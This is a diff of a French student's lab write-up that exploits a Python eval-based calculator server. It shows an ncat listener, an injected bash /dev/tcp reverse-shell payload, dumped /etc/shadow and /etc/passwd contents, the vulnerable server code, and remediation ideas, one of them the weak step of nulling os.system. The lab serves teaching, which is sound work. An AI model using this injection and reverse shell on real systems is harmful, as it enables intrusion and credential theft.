@@ -76,79 +76,157 @@ nico@debian:~/Documents/Resaux-B2$ /bin/python3 /home/nico/Documents/Resaux-B2/T
 
 ## 3. Reverse shell
 
-➜ **Injecter du code c'est bien mais...**
-
-- souvent c'est ***chiant*** si on veut vraiment prendre le contrôle du serveur
-- genre ici, à chaque commande, faut lancer une connexion au serveur étou, relou
-- on pourrait lancer un serveur à nous sur la machine, et s'y connecter, mais s'il y a un firewall, c'est niquéd
-- ***reverse shell* à la rescousse** : l'idée c'est de lancer un shell sur le serveur victime
-
-> C'est *comme* une session SSH, mais c'est à la main, et c'est le serveur qui se connecte à toi pour que toi tu aies le shell. Genre c'est l'inverse de d'habitude. D'où le nom : *reverse* shell.
-
-➜ **Pour pop un reverse shell**
-
-- **en premier**
-  - sur une machine que tu contrôles
-  - tu lances un programme en écoute sur un port donné
-  - un ptit `nc -lvp 9999` par exemple
-- **en deuxième**
-  - sur la machine où tu veux un shell, là où t'as de l'injection de code
-  - tu demandes à l'OS d'ouvrir un port, et de se connecter à ton port ouvert sur la machine que tu contrôles
-  - tu lances un shell (`bash` par exemple)
-  - ce `bash` va "s'accrocher" à la session TCP
-- **enfin**
-  - tu retournes sur la machine que tu contrôles
-  - et normalement, dans ta session `nc -lvp 9999`, t'as un shell qui a pop
-
-➜ **Long story short**
-
-- une commande sur une machine que tu contrôles
-- une commande injectée sur le serveur victime
-- t'as un shell sur le serveur victime depuis la machine que tu contrôles
-
-> Quand tu commences à être bon en bash/réseau étou tu peux pondre ça tout seul. Mais sinon, on se contente de copier des commandes trouvées sur internet c'est très bien.
 
 🌞 **Obtenez un reverse shell sur le serveur**
 
-- si t'as injection de code, t'as sûrement possibilité de pop un reverse shell
-- y'a plein d'exemple sur [le très bon hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
+sur un premier shell j'écoute le port 1111
+
+```bash
+PS C:\Users\nicop> ncat -lvp 1111
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1111
+Ncat: Listening on 0.0.0.0:1111
+Ncat: Connection from 10.1.1.11:60606.
+bash: cannot set terminal process group (1434): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@localhost /]#
+```
+
+sur un autre je me connect au server grace a ncat et j'inject du code
+```bash
+
+PS C:\Users\nicop> ncat 10.1.1.11 13337
+lkjh$
+Hello__import__('os').popen('bash -i >& /dev/tcp/10.1.1.1/1111 0>&1').read()
+
+```
+
 
 🌞 **Pwn**
 
-- voler les fichiers `/etc/shadow` et `/etc/passwd`
+`/etc/shadow`:
+```bash
+root:$6$glQgzdEr8vm6uc23$6jS7IevTizLCm4Je1rBMKLGA8eFXwPHMR2xfzkzkBrmVVdRJvoR.XRfyUZJYf6N8WvIHRr8kL/mvzakVjWOgd1::0:99999:7:::
+bin:*:19453:0:99999:7:::
+daemon:*:19453:0:99999:7:::
+adm:*:19453:0:99999:7:::
+lp:*:19453:0:99999:7:::
+sync:*:19453:0:99999:7:::
+shutdown:*:19453:0:99999:7:::
+halt:*:19453:0:99999:7:::
+mail:*:19453:0:99999:7:::
+operator:*:19453:0:99999:7:::
+games:*:19453:0:99999:7:::
+ftp:*:19453:0:99999:7:::
+nobody:*:19453:0:99999:7:::
+systemd-coredump:!!:19816::::::
+dbus:!!:19816::::::
+tss:!!:19816::::::
+sssd:!!:19816::::::
+chrony:!!:19816::::::
+sshd:!!:19816::::::
+systemd-oom:!*:19816::::::
+nico:$6$SVO8KK00OeQx2yZ9$NZMblD1oOTqa4ws.nJa6OoMCIVIHknuqrEnMcVqKV8QjJWfzTM0qCEISH2JD8P9bEnMTtQ/2c2PsxN4Hxz76E.::0:99999:7:::
+``` 
+
+
+`/etc/passwd` 
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/:/sbin/nologin
+sssd:x:998:995:User for sssd:/:/sbin/nologin
+chrony:x:997:994:chrony system user:/var/lib/chrony:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+systemd-oom:x:992:992:systemd Userspace OOM Killer:/:/usr/sbin/nologin
+nico:x:1000:1000:nico:/home/nico:/bin/bash
+```
 - voler le code serveur de l'application
+
+```python
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', 13337))
+
+s.listen(1)
+conn, addr = s.accept()
+
+while True:
+
+    try:
+        # On re├ºoit la string Hello du client
+        data = conn.recv(1024)
+        if not data: break
+        print(f"Donn├®es re├ºues du client : {data}")
+
+        conn.send("Hello".encode())
+
+        # On re├ºoit le calcul du client
+        data = conn.recv(1024)
+        data = data.decode().strip("\n")
+
+        # Evaluation et envoi du r├®sultat
+        res  = eval(data)
+        conn.send(str(res).encode())
+
+    except socket.error:
+        print("Error Occured.")
+        break
+
+conn.close()
+```
+
 - déterminer si d'autres services sont disponibles sur la machine
 
-## 4. Bonus : DOS
+```bash
+[root@localhost /]# ss -alntupe
+ss -alntupe
+Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
 
-Le DOS dans l'esprit, souvent c'est :
+udp   UNCONN 0      0          127.0.0.1:323        0.0.0.0:*    users:(("chronyd",pid=678,fd=5)) ino:19267 sk:1 cgroup:/system.slice/chronyd.service <->
+udp   UNCONN 0      0              [::1]:323           [::]:*    users:(("chronyd",pid=678,fd=6)) ino:19268 sk:2 cgroup:/system.slice/chronyd.service v6only:1 <->
+tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=717,fd=3)) ino:19803 sk:3 cgroup:/system.slice/sshd.service <->
+tcp   LISTEN 0      1            0.0.0.0:13337      0.0.0.0:*    users:(("python3",pid=11115,fd=3)) ino:32686 sk:4 cgroup:/system.slice/calc.service <->
+tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=717,fd=4)) ino:19812 sk:5 cgroup:/system.slice/sshd.service v6only:1 <->
+[root@localhost /]#
 
-- d'abord t'es un moldu et tu trouves ça incroyable
-- tu deviens un tech, tu te rends compte que c'est pas forcément si compliqué, ptet tu essaies
-- tu deviens meilleur et tu te dis que c'est super lame, c'est nul techniquement, ça mène à rien, exploit c'est mieux
-- tu deviens conscient, et ptet que parfois, des situations t'amèneront à trouver finalement le principe pas si inutile (politique ? militantisme ?)
+```
 
-⭐ **BONUS : DOS l'application**
+à part le serveur aucun service anormale ne troune 
 
-- faut que le service soit indispo, d'une façon ou d'une autre
-- fais le crash, fais le sleep, fais le s'arrêter, peu importe
 
 ## II. Remédiation
 
 🌞 **Proposer une remédiation dév**
 
-- le code serveur ne doit pas exécuter n'importe quoi
-- il faut préserver la fonctionnalité de l'outil
-- **vous devez donc proposer une version mise à jour du code**
-  - code serveur ? code client ? les deux
-  - les fonctionnalités doivent être préservées
-  - les vulnérabilités doivent être fixed
+suprimer eval on peut exécuter le code phyton que l'on veut avec donc le remplacer par 🌞literal_eval🌞
+définir dans le code des imports que l'on veut interdire:
+```python
+import sys
+sys.modules['os'].system = None
+```
+
+
+
 
 🌞 **Proposer une remédiation système**
 
-- l'environnement dans lequel tourne le service est foireux (le user utilisé ?)
-- la machine devrait bloquer les connexions sortantes (pas de reverse shell possible)
-- **vous devez donc proposer une suite d'étapes pour empêcher l'exploitation**
-  - l'app vulnérable doit fonctionner
-  - mais l'exploitation que vous avez utilisé doit être impossible
-  - c'est un des jobs de l'admin (et du mec de sécu qui fait des recommandations aux admins) : héberger des apps vulnérables, mais empêcher l'exploitation
+creer un autre user pour faire tourner le code du serveur pour pas qu'il tourne en root sur la machine
+
+déffinir un parfeux pour bloquer les sorti du serveur sauf réponse utile exemple les pings
